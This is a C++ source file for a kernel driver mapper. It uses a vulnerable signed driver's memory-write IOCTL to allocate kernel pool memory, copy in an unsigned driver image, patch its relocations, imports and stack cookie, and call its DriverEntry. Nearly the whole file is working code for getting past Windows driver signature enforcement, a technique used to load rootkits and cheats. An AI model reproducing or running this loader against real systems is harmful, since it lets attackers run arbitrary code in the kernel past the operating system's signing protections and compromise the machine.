#include "unsigned_load.h"
#include "PE.h"
#define INDEPENDENT_PAGES 0x1000
#define REGULAR_NONPAGED_POOL 0x2000
#define DESCRIPTOR_MODULE 0x8000
#define FIXED_SECURITYCOOKIE_VALUE 0x2B992DDFA232
#define FREE_AFTER_USE FALSE
#define STATUS_UNSUCCESSFUL ((NTSTATUS)0xC0000001L)
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)


BOOL UnsignedDriver::ResolveImports(HANDLE* VulnDriverHandle, PVOID KernelBaseAddress, PVOID ImageBase, PIMAGE_DOS_HEADER ImageDosHeader) {
	PVOID CurrentModuleAddress = NULL;
	PVOID CurrentModuleFunctionAddress = NULL;
	PIMAGE_IMPORT_DESCRIPTOR CurrentImportDescriptor = NULL;
	PIMAGE_THUNK_DATA64 CurrentOriginalFirstThunk = NULL;
	PIMAGE_THUNK_DATA64 CurrentFirstThunk = NULL;
	PIMAGE_IMPORT_BY_NAME CurrentThunkData = NULL;
	PIMAGE_NT_HEADERS64 NtHeaders = PortableExecutable::GetNtHeaders(ImageBase, ImageDosHeader);
	if (NtHeaders == NULL || VulnDriverHandle == NULL || ImageBase == NULL) {
		return FALSE;
	}
	ULONG ImportDataRVA = NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
	if (ImportDataRVA == NULL) {
		return FALSE;
	}
	CurrentImportDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)((ULONG64)ImageBase + ImportDataRVA);
	while (CurrentImportDescriptor->FirstThunk) {

		// Get address of module of current import:
		CurrentModuleAddress = specific::GetKernelModuleAddress((char*)general::ManipulateAddress(ImageBase, CurrentImportDescriptor->Name, TRUE));
		if (CurrentModuleAddress == NULL) {
			return FALSE;
		}

		// Add all of the CUSIMPORT_FUNCTION_INFO for the import descriptor:
		CurrentOriginalFirstThunk = (PIMAGE_THUNK_DATA64)general::ManipulateAddress(ImageBase, CurrentImportDescriptor->OriginalFirstThunk, TRUE);
		CurrentFirstThunk = (PIMAGE_THUNK_DATA64)general::ManipulateAddress(ImageBase, CurrentImportDescriptor->FirstThunk, TRUE);
		while (CurrentOriginalFirstThunk->u1.Function) {
			CurrentThunkData = (PIMAGE_IMPORT_BY_NAME)(general::ManipulateAddress(ImageBase, CurrentOriginalFirstThunk->u1.AddressOfData, TRUE));
			CurrentModuleFunctionAddress = specific::GetKernelModuleExport(VulnDriverHandle, CurrentModuleAddress, (char*)CurrentThunkData->Name);
			if (CurrentModuleFunctionAddress == NULL && CurrentModuleAddress != KernelBaseAddress) {

				// Try to resolve with kernel base as the module:
				CurrentModuleFunctionAddress = specific::GetKernelModuleExport(VulnDriverHandle, KernelBaseAddress, (char*)CurrentThunkData->Name);
				if (CurrentModuleFunctionAddress == NULL) {
					printf("[-] Could not resolve the address of the kernel export named %s, module = %s (%p)\n", (char*)CurrentThunkData->Name, (char*)general::ManipulateAddress(ImageBase, CurrentImportDescriptor->Name, TRUE), CurrentModuleAddress);
					return STATUS_UNSUCCESSFUL;
				}
			}

			// Copy the resolved address into the thunk data in the image:
			RtlCopyMemory(&CurrentFirstThunk->u1.Function, &CurrentModuleFunctionAddress, sizeof(CurrentModuleFunctionAddress));
			++CurrentOriginalFirstThunk;
			++CurrentFirstThunk;
		}
		++CurrentImportDescriptor;  // Move to the descriptor of the next imported function
	}
	return TRUE;
}


BOOL UnsignedDriver::ResolveRelocations(HANDLE* VulnDriverHandle, PVOID KernelBaseAddress, ULONG64 RvaToActualDelta, PVOID ImageBase, PIMAGE_DOS_HEADER ImageDosHeader) {
	PIMAGE_BASE_RELOCATION CurrentBaseRelocation = NULL;
	PIMAGE_BASE_RELOCATION RelocationEndAddress = NULL;
	PVOID RelocationAddressInImage = NULL;
	USHORT* RelocationItemPointer = NULL;
	USHORT RelocationType = 0;
	USHORT RelocationOffset = 0;
	DWORD RelocationCount = 0;
	PIMAGE_NT_HEADERS64 NtHeaders = PortableExecutable::GetNtHeaders(ImageBase, ImageDosHeader);
	if (NtHeaders == NULL || VulnDriverHandle == NULL || ImageBase == NULL) {
		return FALSE;
	}
	DWORD RelocationsRVA = NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;

	CurrentBaseRelocation = (PIMAGE_BASE_RELOCATION)general::ManipulateAddress(ImageBase, RelocationsRVA, TRUE);
	RelocationEndAddress = (PIMAGE_BASE_RELOCATION)general::ManipulateAddress((PVOID)CurrentBaseRelocation, NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size, TRUE);
	while ((ULONG64)CurrentBaseRelocation < (ULONG64)RelocationEndAddress && CurrentBaseRelocation->SizeOfBlock) {
		RelocationAddressInImage = general::ManipulateAddress(ImageBase, CurrentBaseRelocation->VirtualAddress, TRUE);
		RelocationItemPointer = (USHORT*)general::ManipulateAddress(CurrentBaseRelocation, sizeof(IMAGE_BASE_RELOCATION), TRUE);
		RelocationCount = (CurrentBaseRelocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(USHORT);
		for (ULONG RelocIndex = 0; RelocIndex < RelocationCount; ++RelocIndex) {
			RelocationType = RelocationItemPointer[RelocIndex] >> 12;
			RelocationOffset = RelocationItemPointer[RelocIndex] & 0xFFF;
			if (RelocationType == IMAGE_REL_BASED_DIR64) {
				// The relocation type that depends on the running machine, change values accordingly and add the delta:
				*(ULONG64*)(general::ManipulateAddress(RelocationAddressInImage, RelocationOffset, TRUE)) += RvaToActualDelta;
			}
		}
		CurrentBaseRelocation = (PIMAGE_BASE_RELOCATION)general::ManipulateAddress((PVOID)CurrentBaseRelocation, CurrentBaseRelocation->SizeOfBlock, TRUE);
	}
	return TRUE;
}


BOOL UnsignedDriver::FixSecurityCookie(PVOID LocalImageBase, PVOID KernelImageBase, PIMAGE_DOS_HEADER ImageDosHeader) {
	ULONG64 LoadConfigDirectoryRva = NULL;  // Part that includes the actual security cookie, if not found -> security cookie probably not defined
	PIMAGE_LOAD_CONFIG_DIRECTORY LoadConfigStruct = NULL;
	PVOID StackCookie = NULL;
	PIMAGE_NT_HEADERS64 NtHeaders = PortableExecutable::GetNtHeaders(LocalImageBase, ImageDosHeader);
	if (NtHeaders == NULL) {
		return FALSE;
	}
	LoadConfigDirectoryRva = NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG].VirtualAddress;
	if (LoadConfigDirectoryRva == NULL){
		printf("[+] Loading configuration directory does not exist / not found, skipping stack cookie fixing (might not be defined)\n");
		return TRUE;
	}
	LoadConfigStruct = (PIMAGE_LOAD_CONFIG_DIRECTORY)general::ManipulateAddress(LocalImageBase,	LoadConfigDirectoryRva, TRUE);
	StackCookie = (PVOID)LoadConfigStruct->SecurityCookie;
	if (StackCookie == NULL) {
		printf("[+] Stack cookie was not found in loading configuration directory, skipping stack cookie fixing\n");
		return TRUE;
	}
	StackCookie = general::ManipulateAddress(StackCookie, (ULONG64)general::ManipulateAddress(KernelImageBase, (ULONG64)LocalImageBase, TRUE), FALSE);
	if (*(ULONG64*)(StackCookie) != FIXED_SECURITYCOOKIE_VALUE) {
		printf("[-] Stack cookie was already fixed (which means something went wrong / the image data is wrong)\n");
		return FALSE;
	}
	*(ULONG64*)(StackCookie) = FIXED_SECURITYCOOKIE_VALUE ^ GetCurrentProcessId() ^ GetCurrentThreadId();
	if (*(ULONG64*)(StackCookie) != FIXED_SECURITYCOOKIE_VALUE) {
		*(ULONG64*)(StackCookie) = 0x2B992DDFA233;
	}
	printf("[+] Stack cookie was fixed to %llu\n", *(ULONG64*)(StackCookie));
	return TRUE;
}


PVOID UnsignedDriver::LoadDriver(HANDLE* VulnDeviceHandle, PVOID KernelBaseAddress, PVOID UnsignedDataPool, ULONG PoolType, NTSTATUS* ReturnStatus) {
	PMDL DescriptorModule = NULL;
	PVOID LocalUnsignedImage = NULL;
	PVOID KernelUnsignedImage = NULL;
	PVOID ActualKernelImageBase = NULL;  // Used when ignoring headers of image in kernel to save the actual base
	PVOID LocalUnsignedSectionAddress = NULL;
	PVOID UnsignedEntryPoint = NULL;
	DWORD RelativeHeadersSize = 0;
	NTSTATUS LocalReturn = STATUS_UNSUCCESSFUL;  // Used for when ReturnStatus = NULL
	ULONG64 UsedImageSize = 0;
	BOOL FreeStatus = FALSE;
	PIMAGE_SECTION_HEADER CurrentImageSection = NULL;
	PIMAGE_NT_HEADERS64 ImageNtHeaders = PortableExecutable::GetNtHeaders(UnsignedDataPool, NULL);
	
	
	// Get NT headers and verify build to be 64 bit:
	if (ImageNtHeaders == NULL) {
		printf("[-] Cannot get the NT headers data of the unsigned image for loading\n");
		return NULL;
	}
	if (ImageNtHeaders->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
		printf("[-] unsigned image is not 64 bit, cannot load unsigned driver\n");
		return NULL;
	}


	// Allocate a local buffer for the image data for transfer:
	LocalUnsignedImage = VirtualAlloc(NULL, ImageNtHeaders->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (LocalUnsignedImage == NULL) {
		printf("[-] Cannot allocate local buffer for unsigned driver data transfer to kernel mode pool\n");
		return NULL;
	}


	// Allocate memory for unsigned driver:
	RelativeHeadersSize = (IMAGE_FIRST_SECTION(ImageNtHeaders))->VirtualAddress;
	UsedImageSize = ImageNtHeaders->OptionalHeader.SizeOfImage - RelativeHeadersSize;
	switch (PoolType) {
	case REGULAR_NONPAGED_POOL:
		KernelUnsignedImage = allocations::ExAllocatePoolWithTag(VulnDeviceHandle, KernelBaseAddress, nt::POOL_TYPE::NonPagedPool, UsedImageSize);
		break;
	case DESCRIPTOR_MODULE:
		KernelUnsignedImage = allocations::AllocateDescriptorModuleWrapper(VulnDeviceHandle, KernelBaseAddress, UsedImageSize, &DescriptorModule);
		break;
	case INDEPENDENT_PAGES:
		KernelUnsignedImage = allocations::AllocateIndependentPagesWrapper(VulnDeviceHandle, KernelBaseAddress, UsedImageSize);
		break;
	}
	if (KernelUnsignedImage == NULL) {
		printf("[-] Cannot allocate kernel mode pool memory for unsigned driver data for loading / invalid allocation method provided (0x%x)\n", PoolType);
		VirtualFree(LocalUnsignedImage, 0, MEM_RELEASE);
		return NULL;
	}


	// Load unsigned driver data into KM buffer, fix imports, fix relocations, fix security cookie, call entry point, return status:
	while (TRUE) {
		// Note: using while here so i could use break to skip the proceeding code lines in the loop in certain cases
		printf("[!] Allocated memory for unsigned data in kernel, base address = %p, allocation size = %llu, skipping %lu bytes of headers\n", KernelUnsignedImage, UsedImageSize, RelativeHeadersSize);

		// Copy image headers and sections to the local data pool:
		memcpy(LocalUnsignedImage, UnsignedDataPool, ImageNtHeaders->OptionalHeader.SizeOfHeaders);
		CurrentImageSection = IMAGE_FIRST_SECTION(ImageNtHeaders);
		for (ULONG SectionIndex = 0; SectionIndex < ImageNtHeaders->FileHeader.NumberOfSections; ++SectionIndex) {
			if ((CurrentImageSection[SectionIndex].Characteristics & IMAGE_SCN_CNT_UNINITIALIZED_DATA) > 0) {
				continue;  // This section is uninitialized, not important
			}
			LocalUnsignedSectionAddress = general::ManipulateAddress(LocalUnsignedImage, CurrentImageSection[SectionIndex].VirtualAddress, TRUE);
			RtlCopyMemory(LocalUnsignedSectionAddress, general::ManipulateAddress(UnsignedDataPool, CurrentImageSection[SectionIndex].PointerToRawData, TRUE), CurrentImageSection[SectionIndex].SizeOfRawData);
		}

		// Reduce the operated-on kernel address by the size of the headers, are ignored in actual buffer:
		ActualKernelImageBase = KernelUnsignedImage;
		KernelUnsignedImage = general::ManipulateAddress(KernelUnsignedImage, RelativeHeadersSize, FALSE);

		// Resolve relocations, imports and fix security cookie:
		UnsignedDriver::ResolveRelocations(VulnDeviceHandle, KernelBaseAddress, (ULONG64)general::ManipulateAddress(KernelUnsignedImage, ImageNtHeaders->OptionalHeader.ImageBase, FALSE), LocalUnsignedImage, NULL);
		if (!UnsignedDriver::FixSecurityCookie(LocalUnsignedImage, KernelUnsignedImage, NULL)) {
			printf("[-] Failed to fix security cookie of local image\n");
			VirtualFree(LocalUnsignedImage, 0, MEM_RELEASE);
			return NULL;
		}
		if (!UnsignedDriver::ResolveImports(VulnDeviceHandle, KernelBaseAddress, LocalUnsignedImage, NULL)) {
			printf("[-] Failed to resolve imports of local image\n");
			KernelUnsignedImage = ActualKernelImageBase;
			break;
		}

		// Write fixed unsigned driver image into kernel pool:
		if (!VulnurableDriver::IoctlFunctions::MemoryWrite(VulnDeviceHandle, ActualKernelImageBase, general::ManipulateAddress(LocalUnsignedImage, RelativeHeadersSize, TRUE), UsedImageSize)) {
			printf("[-] Failed to write local image data into kernel memory pool\n");
			KernelUnsignedImage = ActualKernelImageBase;
			break;
		}

		// Call DriverEntry entrypoint of unsigned driver and return return status:
		// NOTE: can pass any and how many parameters i want by modifying DriverEntry() and add more parameters to CallKernelFunction()
		UnsignedEntryPoint = general::ManipulateAddress(KernelUnsignedImage, ImageNtHeaders->OptionalHeader.AddressOfEntryPoint, TRUE);
		printf("[+] Calling unsigned driver entrypoint (DriverEntry()) from address %p\n", UnsignedEntryPoint);
		if (!CallKernelFunction(VulnDeviceHandle, &LocalReturn, KernelBaseAddress, UnsignedEntryPoint, ActualKernelImageBase, UsedImageSize)) {
			printf("[-] Failed to call DriverEntry entrypoint of unsigned driver\n");
			KernelUnsignedImage = ActualKernelImageBase;
			break;
		}
		if (ReturnStatus != NULL) {
			*ReturnStatus = LocalReturn;
		}
		printf("[+] Unsigned driver\'s DriverEntry() returned 0x%x\n", LocalReturn);

		// Free the kernel memory pool used for the unsigned driver (CURRENTLY NOT USED, DRIVER NOT OPERATIONAL AFTER DRIVERENTRY RETURNS):
		if (FREE_AFTER_USE) {
			switch (PoolType) {
			case REGULAR_NONPAGED_POOL:
				FreeStatus = allocations::ExFreePool(VulnDeviceHandle, KernelBaseAddress, ActualKernelImageBase);
				break;
			case DESCRIPTOR_MODULE:
				FreeStatus = allocations::MmUnmapLockedPages(VulnDeviceHandle, KernelBaseAddress, ActualKernelImageBase, DescriptorModule) &&
					allocations::MmFreePagesFromMdl(VulnDeviceHandle, KernelBaseAddress, DescriptorModule) &&
					allocations::ExFreePool(VulnDeviceHandle, KernelBaseAddress, DescriptorModule);
				break;
			case INDEPENDENT_PAGES:
				FreeStatus = allocations::MmFreeIndependentPages(VulnDeviceHandle, KernelBaseAddress, ActualKernelImageBase, UsedImageSize);
				break;
			}
			if (!FreeStatus) {
				printf("[!] Failed to free unsigned driver kernel memory pool\n");
			}
			else {
				printf("[+] Freed unsigned driver kernel memory pool\n");
			}
		}
		VirtualFree(LocalUnsignedImage, 0, MEM_RELEASE);
		return ActualKernelImageBase;
	}


	// If non-critical error occured code execution will continue here, free memory and exit function:
	VirtualFree(LocalUnsignedImage, 0, MEM_RELEASE);
	if (FREE_AFTER_USE) {
		switch (PoolType) {
		case REGULAR_NONPAGED_POOL:
			FreeStatus = allocations::ExFreePool(VulnDeviceHandle, KernelBaseAddress, ActualKernelImageBase);
			break;
		case DESCRIPTOR_MODULE:
			FreeStatus = allocations::MmUnmapLockedPages(VulnDeviceHandle, KernelBaseAddress, ActualKernelImageBase, DescriptorModule) &&
				allocations::MmFreePagesFromMdl(VulnDeviceHandle, KernelBaseAddress, DescriptorModule) &&
				allocations::ExFreePool(VulnDeviceHandle, KernelBaseAddress, DescriptorModule);
			break;
		case INDEPENDENT_PAGES:
			FreeStatus = allocations::MmFreeIndependentPages(VulnDeviceHandle, KernelBaseAddress, ActualKernelImageBase, UsedImageSize);
			break;
		}
		if (!FreeStatus) {
			printf("[!] Failed to free unsigned driver kernel memory pool, non-critical error\n");
		}
		else {
			printf("[+] Freed unsigned driver kernel memory pool, non-critical error\n");
		}
	}
	return NULL;
}